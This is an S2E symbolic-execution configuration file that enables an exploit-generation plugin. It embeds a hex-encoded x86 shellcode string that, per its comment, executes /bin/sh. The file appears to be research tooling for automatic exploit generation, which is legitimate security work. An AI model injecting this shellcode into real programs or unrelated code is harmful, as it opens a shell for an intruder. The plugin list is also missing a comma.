s2e = {
    kleeArgs = {
        --"--debug-constraints",
    }
}


plugins = {
    -- Enable a plugin that handles S2E custom opcode
    "BaseInstructions"
    -- Enable a plugin that generate expolit
    "ExploitGenerator",
}

pluginsConfig = {}

pluginsConfig.ExploitGenerator = {
    -- Shellcode for exec /bin/sh
    shellCode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80",
}

-- vim: sw=4 sts=4 et
